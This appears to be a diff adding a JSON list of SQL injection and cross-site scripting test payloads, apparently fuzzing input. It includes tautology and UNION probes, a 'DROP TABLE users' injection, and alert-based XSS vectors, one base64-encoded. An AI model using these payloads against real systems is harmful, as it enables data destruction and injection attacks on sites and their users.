@@ -1,0 +1,24 @@
+[
+    "' OR '1'='1",
+    "' UNION SELECT NULL--",
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "'; DROP TABLE users; --",
+    "\" OR \"\" = \"",
+    "' OR 'a'='a",
+    "' OR 1=1 --",
+    "' OR 1=1#",
+    "' OR x=x --",
+
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "\"><script>alert('XSS')</script>",
+    "<svg onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "'\"><img src=x onerror=alert('XSS')>",
+    "<iframe src=javascript:alert('XSS')>",
+    "<math><mi//xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></math>",
+    "<object data=javascript:alert(1)>",
+    "<details open ontoggle=alert(1)>"
+
+]
